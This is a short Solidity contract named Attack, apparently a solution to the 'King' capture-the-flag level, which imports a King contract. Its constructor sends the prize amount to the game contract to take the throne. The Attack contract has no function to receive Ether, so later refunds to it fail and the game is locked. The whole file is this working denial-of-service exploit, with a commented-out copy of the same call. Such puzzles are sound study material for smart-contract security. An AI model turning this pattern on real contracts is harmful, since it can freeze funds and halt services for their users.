// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./10_King.sol";

contract Attack {
    King king;

    constructor(address payable _king) payable {
        king = King(_king);
        (bool success, ) = address(king).call{value: king.prize()}("");
        require(success, "Transfer Failed");
    }

    // function changeResult() public payable {
    //   (bool success,) = address(king).call{value : king.prize()}("");
    //   require(success, "Transfer Failed");
    // }
}
